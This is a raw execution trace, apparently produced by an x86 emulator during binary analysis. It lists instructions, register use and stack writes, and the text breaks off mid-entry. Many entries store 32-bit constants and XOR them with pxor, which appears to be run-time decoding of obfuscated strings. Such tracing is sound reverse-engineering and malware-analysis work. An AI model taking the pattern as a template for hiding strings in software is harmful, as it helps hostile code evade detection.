0x45f86f: mov dword ptr [esp + 0x1f4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x678 and offset 0x81f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45f87a: mov dword ptr [esp + 0x1fc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x678 and offset 0x81fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45f881: pxor xmm1, xmmword ptr [esp + 0x1f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x678 and offset 0x81f0 for stack size 0x10000 0x45f88a: movaps xmmword ptr [esp + 0x30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x678 and offset 0x8030 for stack size 0x10000 saving data to stack: 297750249798 16 0x45f8a5: mov dword ptr [esp + 0x1d0], 0x138fe192, regs_read: [30], regs_write: () adjusting stack for ESP 0x678 and offset 0x81d0 for stack size 0x10000 saving data to stack: 328196498 4 0x45f8ce: push esi, regs_read: [30, 29], regs_write: [30] 0x45f8df: push edx, regs_read: [30, 24], regs_write: [30] 0x45f8e0: push dword ptr [esp + 0x28], regs_read: [30], regs_write: [30] 0x45f8ec: push dword ptr [esp + 0x28], regs_read: [30], regs_write: [30] 0x45f8f8: push dword ptr [esp + 0x38], regs_read: [30], regs_write: [30] 0x45f904: mov dword ptr [esp + 0x1e8], 0x464c479b, regs_read: [30], regs_write: () adjusting stack for ESP 0x664 and offset 0x81e8 for stack size 0x10000 saving data to stack: 1179404187 4 0x45f90f: mov dword ptr [esp + 0x1ec], 0x3e1aeb5d, regs_read: [30], regs_write: () adjusting stack for ESP 0x664 and offset 0x81ec for stack size 0x10000 saving data to stack: 1041951581 4 0x45f91a: mov dword ptr [esp + 0x1f0], 0x27a68cb0, regs_read: [30], regs_write: () adjusting stack for ESP 0x664 and offset 0x81f0 for stack size 0x10000 saving data to stack: 665226416 4 0x45f925: mov dword ptr [esp + 0x1f4], 0x7b7bee00, regs_read: [30], regs_write: () adjusting stack for ESP 0x664 and offset 0x81f4 for stack size 0x10000 saving data to stack: 2071719424 4 0x45f930: mov dword ptr [esp + 0x1f8], 0x8ef2ee3b, regs_read: [30], regs_write: () adjusting stack for ESP 0x664 and offset 0x81f8 for stack size 0x10000 saving data to stack: 2398285371 4 0x45f93b: mov dword ptr [esp + 0x1fc], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP 0x664 and offset 0x81fc for stack size 0x10000 saving data to stack: 586689126 4 0x45f946: mov dword ptr [esp + 0x200], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP 0x664 and offset 0x8200 for stack size 0x10000 saving data to stack: 1701587195 4 0x45f951: push ecx, regs_read: [30, 22], regs_write: [30] 0x45f952: mov dword ptr [esp + 0x458], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x660 and offset 0x8458 for stack size 0x10000 saving data to stack: 914789047 4 0x45f95d: mov dword ptr [esp + 0x45c], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x660 and offset 0x845c for stack size 0x10000 saving data to stack: 896093928 4 0x45f968: mov dword ptr [esp + 0x460], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x660 and offset 0x8460 for stack size 0x10000 saving data to stack: 929680980 4 0x45f973: mov dword ptr [esp + 0x464], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x660 and offset 0x8464 for stack size 0x10000 saving data to stack: 1389027477 4 0x45f97e: movaps xmm1, xmmword ptr [esp + 0x458], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x660 and offset 0x8458 for stack size 0x10000 0x45f986: pxor xmm1, xmmword ptr [esp + 0x1e8], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x660 and offset 0x81e8 for stack size 0x10000 0x45f98f: push edi, regs_read: [30, 23], regs_write: [30] 0x45f990: mov edi, dword ptr [esp + 0x78], regs_read: [30], regs_write: [23] adjusting stack for ESP 0x65c and offset 0x8078 for stack size 0x10000 0x45f994: push eax, regs_read: [30, 19], regs_write: [30] 0x45f995: movaps xmmword ptr [esp + 0x1f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x658 and offset 0x81f0 for stack size 0x10000 saving data to stack: 156082637002160692381338396013141521189 16 0x45f9a4: mov dword ptr [esp + 0x470], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x658 and offset 0x8470 for stack size 0x10000 saving data to stack: 1913178889 4 0x45f9af: mov dword ptr [esp + 0x474], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP 0x658 and offset 0x8474 for stack size 0x10000 saving data to stack: 2231344414 4 0x45f9ba: mov dword ptr [esp + 0x478], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP 0x658 and offset 0x8478 for stack size 0x10000 saving data to stack: 586689126 4 0x45f9c5: mov dword ptr [esp + 0x47c], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP 0x658 and offset 0x847c for stack size 0x10000 saving data to stack: 1701587195 4 0x45f9d0: movaps xmm1, xmmword ptr [esp + 0x470], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x658 and offset 0x8470 for stack size 0x10000 0x45f9d8: pxor xmm1, xmmword ptr [esp + 0x200], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x658 and offset 0x8200 for stack size 0x10000 0x45f9e1: push eax, regs_read: [30, 19], regs_write: [30] 0x45f9e2: push edi, regs_read: [30, 23], regs_write: [30] 0x45f9e3: movaps xmmword ptr [esp + 0x208], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x650 and offset 0x8208 for stack size 0x10000 saving data to stack: 724361717986043145 16 0x45fa36: push eax, regs_read: [30, 19], regs_write: [30] 0x45fa4b: push edi, regs_read: [30, 23], regs_write: [30] 0x45fa51: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45fa52: mov edi, dword ptr [esp + 0x10], regs_read: [30], regs_write: [23] adjusting stack for ESP 0x64c and offset 0x8010 for stack size 0x10000 0x45fa56: mov byte ptr [esp + 0xf], 1, regs_read: [30], regs_write: () adjusting stack for ESP 0x64c and offset 0x800f for stack size 0x10000 saving data to stack: 1 1 0x45fa64: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x64c and offset 0x8018 for stack size 0x10000 0x45fa8e: push eax, regs_read: [30, 19], regs_write: [30] 0x45faac: mov eax, dword ptr [esp + 0x14], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x648 and offset 0x8014 for stack size 0x10000 0x45faca: push ecx, regs_read: [30, 22], regs_write: [30] 0x45fad7: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45fae4: pop edi, regs_read: [30], regs_write: [30, 23] 0x45fae7: pop esi, regs_read: [30], regs_write: [30, 29] 0x45fae8: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x650 and offset 0x8000 for stack size 0x10000 0x45faea: pop ebp, regs_read: [30], regs_write: [30, 20] 0x45faf2: push ebp, regs_read: [30, 20], regs_write: [30] 0x45faf3: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x45fafe: mov ecx, 0x4f0720, regs_read: (), regs_write: [22] 0x45fb03: push esi, regs_read: [30, 29], regs_write: [30] 0x45fb04: push edi, regs_read: [30, 23], regs_write: [30] 0x45fb0a: mov edi, 0x4f06e0, regs_read: (), regs_write: [23] 0x45fb0f: mov esi, 0x3769ce54, regs_read: (), regs_write: [29] 0x45fb14: mov edx, 0x52cae095, regs_read: (), regs_write: [24] 0x45fb1d: mov ecx, 0x4f05e0, regs_read: (), regs_write: [22] 0x45fb2f: mov dword ptr [esp + 0x25c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x825c for stack size 0x10000 saving data to stack: 1389027477 4 0x45fb3d: mov dword ptr [esp + 0x250], 0x3686f0c0, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8250 for stack size 0x10000 saving data to stack: 914813120 4 0x45fb4f: mov dword ptr [esp + 0x254], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8254 for stack size 0x10000 saving data to stack: 896093928 4 0x45fb5a: mov dword ptr [esp + 0x258], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x8 and offset 0x8258 for stack size 0x10000 saving data to stack: 929680980 4 0x45fb61: movaps xmm1, xmmword ptr [esp + 0x250], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8250 for stack size 0x10000 0x45fb69: mov dword ptr [esp + 0x1c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45fb6d: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x45fb75: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45fb7d: mov dword ptr [esp + 0x18], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x8 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45fb81: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 0x45fb87: movaps xmmword ptr [esp + 0x250], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x8250 for stack size 0x10000 saving data to stack: 25207 16 0x45fb8f: mov dword ptr [esp + 0x140], 0x45e7e2eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8140 for stack size 0x10000 saving data to stack: 1172824811 4 0x45fb9a: mov dword ptr [esp + 0x144], 0x4706399b, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8144 for stack size 0x10000 saving data to stack: 1191590299 4 0x45fba5: mov dword ptr [esp + 0x148], 0x4347bd30, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8148 for stack size 0x10000 saving data to stack: 1128774960 4 0x45fbb0: mov dword ptr [esp + 0x14c], 0x52ca94ed, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x814c for stack size 0x10000 saving data to stack: 1389008109 4 0x45fbbb: movaps xmm1, xmmword ptr [esp + 0x140], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8140 for stack size 0x10000 0x45fbc3: mov dword ptr [esp + 0x1c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45fbc7: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x45fbcc: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x45fbd4: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45fbdc: mov dword ptr [esp + 0x18], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x8 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45fbe0: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 0x45fbe6: push eax, regs_read: [30, 19], regs_write: [30] 0x45fbe7: movaps xmmword ptr [esp + 0x144], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x8144 for stack size 0x10000 saving data to stack: 2362302849941957533868181168418908 16 0x45fbf4: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45fbfb: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45fc04: push ecx, regs_read: [30, 22], regs_write: [30] 0x45fc05: push eax, regs_read: [30, 19], regs_write: [30] 0x45fc0b: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45fc0c: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45fc0d: mov edi, eax, regs_read: [19], regs_write: [23] 0x45fc16: mov dword ptr [esp + 0x2c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x8 and offset 0x802c for stack size 0x10000 saving data to stack: 5179104 4 0x45fc2e: mov ecx, 0x4f06e0, regs_read: (), regs_write: [22] 0x45fc3a: push ecx, regs_read: [30, 22], regs_write: [30] 0x45fc3b: push edi, regs_read: [30, 23], regs_write: [30] 0x45fc41: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45fc42: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45fc43: mov esi, 0x4f0720, regs_read: (), regs_write: [29] 0x45fc48: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45fc6a: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45fc71: mov eax, dword ptr [esp + 0x98], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x8098 for stack size 0x10000 0x45fc78: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45fc7a: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x800c for stack size 0x10000 saving data to stack: 896093928 4 0x45fc86: mov dword ptr [esp + 8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x8008 for stack size 0x10000 saving data to stack: 896093928 4 0x45fc91: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45fc93: push eax, regs_read: [30, 19], regs_write: [30] 0x45fca0: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45fca2: push eax, regs_read: [30, 19], regs_write: [30] 0x45fcaf: push eax, regs_read: [30, 19], regs_write: [30] 0x45fcc1: mov esi, 0x368692b7, regs_read: (), regs_write: [29] 0x45fcc6: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45fccb: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45fcd0: mov dword ptr [esp + 0x170], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x14 and offset 0x8170 for stack size 0x10000 saving data to stack: 914789047 4 0x45fcd7: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45fcdc: mov dword ptr [esp + 0x174], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x14 and offset 0x8174 for stack size 0x10000 saving data to stack: 896093928 4 0x45fce3: mov dword ptr [esp + 0x178], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x14 and offset 0x8178 for stack size 0x10000 saving data to stack: 929680980 4 0x45fcea: mov dword ptr [esp + 0x17c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x14 and offset 0x817c for stack size 0x10000 saving data to stack: 1389027477 4 0x45fcf1: mov dword ptr [esp + 0x190], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x14 and offset 0x8190 for stack size 0x10000 saving data to stack: 914789047 4 0x45fcf8: mov dword ptr [esp + 0x194], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x14 and offset 0x8194 for stack size 0x10000 saving data to stack: 896093928 4 0x45fcff: mov dword ptr [esp + 0x198], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x14 and offset 0x8198 for stack size 0x10000 saving data to stack: 929680980 4 0x45fd06: mov dword ptr [esp + 0x19c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x14 and offset 0x819c for stack size 0x10000 saving data to stack: 1389027477 4 0x45fd0d: mov dword ptr [esp + 0x1b0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x14 and offset 0x81b0 for stack size 0x10000 saving data to stack: 914789047 4 0x45fd14: mov dword ptr [esp + 0x1b4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x14 and offset 0x81b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45fd1b: mov dword ptr [esp + 0x1b8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x14 and offset 0x81b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45fd22: mov dword ptr [esp + 0x1bc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x14 and offset 0x81bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45fd29: mov dword ptr [esp + 0x1d0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x14 and offset 0x81d0 for stack size 0x10000 saving data to stack: 914789047 4 0x45fd30: mov dword ptr [esp + 0x1d4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x14 and offset 0x81d4 for stack size 0x10000 saving data to stack: 896093928 4 0x45fd37: mov dword ptr [esp + 0x1d8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x14 and offset 0x81d8 for stack size 0x10000 saving data to stack: 929680980 4 0x45fd3e: mov dword ptr [esp + 0x1dc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x14 and offset 0x81dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45fd4e: push 0x4dc4fe, regs_read: [30], regs_write: [30] 0x45fd5a: mov esi, eax, regs_read: [19], regs_write: [29] 0x45fd61: push 0x4dc4ff, regs_read: [30], regs_write: [30] 0x45fd72: push 0x4dc50d, regs_read: [30], regs_write: [30] 0x45fd83: push 0x4dc50e, regs_read: [30], regs_write: [30] 0x45fd94: mov dword ptr [esp + 0xe0], 0x36eae0c2, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x80e0 for stack size 0x10000 saving data to stack: 921362626 4 0x45fda6: mov dword ptr [esp + 0xe4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x80e4 for stack size 0x10000 saving data to stack: 896093928 4 0x45fdb1: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45fdb3: mov dword ptr [esp + 0xe8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x80e8 for stack size 0x10000 saving data to stack: 929680980 4 0x45fdbe: mov dword ptr [esp + 0xec], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x80ec for stack size 0x10000 saving data to stack: 1389027477 4 0x45fdc9: movaps xmm0, xmmword ptr [esp + 0xe0], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x24 and offset 0x80e0 for stack size 0x10000 0x45fdd1: pxor xmm0, xmmword ptr [esp + 0x170], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x24 and offset 0x8170 for stack size 0x10000 0x45fdda: push eax, regs_read: [30, 19], regs_write: [30] 0x45fddb: movaps xmmword ptr [esp + 0xe4], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x28 and offset 0x80e4 for stack size 0x10000 saving data to stack: 110050094701684109340028828550767350705 16 0x45fdf1: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45fdf6: mov dword ptr [esp + 0xf0], 0x36eae0c2, regs_read: [30], regs_write: () adjusting stack for ESP -0x28 and offset 0x80f0 for stack size 0x10000 saving data to stack: 921362626 4 0x45fe01: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45fe06: mov dword ptr [esp + 0xf4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x28 and offset 0x80f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45fe0d: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45fe12: mov dword ptr [esp + 0xf8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x28 and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45fe19: mov dword ptr [esp + 0xfc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x28 and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45fe20: movaps xmm1, xmmword ptr [esp + 0xf0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x28 and offset 0x80f0 for stack size 0x10000 0x45fe28: mov dword ptr [esp + 0x188], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x28 and offset 0x8188 for stack size 0x10000 saving data to stack: 929680980 4 0x45fe2f: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45fe31: mov dword ptr [esp + 0x18c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x28 and offset 0x818c for stack size 0x10000 saving data to stack: 1389027477 4 0x45fe3f: mov dword ptr [esp + 0x184], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x28 and offset 0x8184 for stack size 0x10000 saving data to stack: 896093928 4 0x45fe46: mov dword ptr [esp + 0x180], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x28 and offset 0x8180 for stack size 0x10000 saving data to stack: 914789047 4 0x45fe51: pxor xmm1, xmmword ptr [esp + 0x180], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x28 and offset 0x8180 for stack size 0x10000 0x45fe5a: push eax, regs_read: [30, 19], regs_write: [30] 0x45fe5b: movaps xmmword ptr [esp + 0xf4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x2c and offset 0x80f4 for stack size 0x10000 saving data to stack: 7107189 16 0x45fe6f: push ecx, regs_read: [30, 22], regs_write: [30] 0x45fe70: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45fe77: push dword ptr [esp + 0x15c], regs_read: [30], regs_write: [30] 0x45fe85: push dword ptr [esp + 0x15c], regs_read: [30], regs_write: [30] 0x45fe91: movaps xmm1, xmmword ptr [esp + 0x190], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x38 and offset 0x8190 for stack size 0x10000 0x45fea0: mov dword ptr [esp + 0x100], 0x5fe1fddb, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8100 for stack size 0x10000 saving data to stack: 1608646107 4 0x45feab: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45fead: mov dword ptr [esp + 0x104], 0x35694e86, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8104 for stack size 0x10000 saving data to stack: 896093830 4 0x45feb8: mov dword ptr [esp + 0x108], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45fec3: mov dword ptr [esp + 0x10c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x45fece: pxor xmm1, xmmword ptr [esp + 0x100], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x38 and offset 0x8100 for stack size 0x10000 0x45fed7: push eax, regs_read: [30, 19], regs_write: [30] 0x45fed8: movaps xmmword ptr [esp + 0x104], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x3c and offset 0x8104 for stack size 0x10000 saving data to stack: 474214788972 16 0x45feee: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45fef3: mov dword ptr [esp + 0x110], 0x5fe1fddb, regs_read: [30], regs_write: () adjusting stack for ESP -0x3c and offset 0x8110 for stack size 0x10000 saving data to stack: 1608646107 4 0x45fefe: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45ff03: mov dword ptr [esp + 0x118], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x3c and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x45ff0a: mov dword ptr [esp + 0x11c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x3c and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ff11: mov dword ptr [esp + 0x114], 0x35694e86, regs_read: [30], regs_write: () adjusting stack for ESP -0x3c and offset 0x8114 for stack size 0x10000 saving data to stack: 896093830 4 0x45ff1c: movaps xmm1, xmmword ptr [esp + 0x110], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x3c and offset 0x8110 for stack size 0x10000 0x45ff24: mov dword ptr [esp + 0x1a8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x3c and offset 0x81a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45ff2b: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ff2d: mov dword ptr [esp + 0x1ac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x3c and offset 0x81ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45ff3b: mov dword ptr [esp + 0x1a0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x3c and offset 0x81a0 for stack size 0x10000 saving data to stack: 914789047 4 0x45ff46: mov dword ptr [esp + 0x1a4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x3c and offset 0x81a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45ff51: pxor xmm1, xmmword ptr [esp + 0x1a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x3c and offset 0x81a0 for stack size 0x10000 0x45ff5a: push eax, regs_read: [30, 19], regs_write: [30] 0x45ff5b: movaps xmmword ptr [esp + 0x114], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x40 and offset 0x8114 for stack size 0x10000 saving data to stack: 474214788972 16 0x45ff6f: push ecx, regs_read: [30, 22], regs_write: [30] 0x45ff70: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45ff77: push dword ptr [esp + 0x164], regs_read: [30], regs_write: [30] 0x45ff85: push dword ptr [esp + 0x164], regs_read: [30], regs_write: [30] 0x45ff91: movaps xmm1, xmmword ptr [esp + 0x1b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4c and offset 0x81b0 for stack size 0x10000 0x45ffa0: mov dword ptr [esp + 0x120], 0x45f5f3c7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8120 for stack size 0x10000 saving data to stack: 1173746631 4 0x45ffab: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ffad: mov dword ptr [esp + 0x124], 0x511b219f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8124 for stack size 0x10000 saving data to stack: 1360732575 4 0x45ffb8: mov dword ptr [esp + 0x128], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x45ffc3: mov dword ptr [esp + 0x12c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ffce: pxor xmm1, xmmword ptr [esp + 0x120], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4c and offset 0x8120 for stack size 0x10000 0x45ffd7: push eax, regs_read: [30, 19], regs_write: [30] 0x45ffd8: movaps xmmword ptr [esp + 0x124], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x50 and offset 0x8124 for stack size 0x10000 saving data to stack: 7237970109966541168 16 0x45ffee: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45fff3: mov dword ptr [esp + 0x130], 0x45f5f3c7, regs_read: [30], regs_write: () adjusting stack for ESP -0x50 and offset 0x8130 for stack size 0x10000 saving data to stack: 1173746631 4 0x45fffe: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x460003: mov dword ptr [esp + 0x138], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x50 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x46000a: mov dword ptr [esp + 0x13c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x50 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x460011: mov dword ptr [esp + 0x134], 0x511b219f, regs_read: [30], regs_write: () adjusting stack for ESP -0x50 and offset 0x8134 for stack size 0x10000 saving data to stack: 1360732575 4 0x46001c: movaps xmm1, xmmword ptr [esp + 0x130], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x50 and offset 0x8130 for stack size 0x10000 0x460024: mov dword ptr [esp + 0x1c8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x50 and offset 0x81c8 for stack size 0x10000 saving data to stack: 929680980 4 0x46002b: mov ecx, esi, regs_read: [29], regs_write: [22] 0x46002d: mov dword ptr [esp + 0x1cc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x50 and offset 0x81cc for stack size 0x10000 saving data to stack: 1389027477 4 0x46003b: mov dword ptr [esp + 0x1c0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x50 and offset 0x81c0 for stack size 0x10000 saving data to stack: 914789047 4 0x460046: mov dword ptr [esp + 0x1c4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x50 and offset 0x81c4 for stack size 0x10000 saving data to stack: 896093928 4 0x460051: pxor xmm1, xmmword ptr [esp + 0x1c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x50 and offset 0x81c0 for stack size 0x10000 0x46005a: push eax, regs_read: [30, 19], regs_write: [30] 0x46005b: movaps xmmword ptr [esp + 0x134], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x54 and offset 0x8134 for stack size 0x10000 saving data to stack: 7237970109966541168 16 0x46006f: push ecx, regs_read: [30, 22], regs_write: [30] 0x460070: mov ecx, eax, regs_read: [19], regs_write: [22] 0x460077: push dword ptr [esp + 0x16c], regs_read: [30], regs_write: [30] 0x460085: push dword ptr [esp + 0x16c], regs_read: [30], regs_write: [30] 0x460091: movaps xmm1, xmmword ptr [esp + 0x1d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x60 and offset 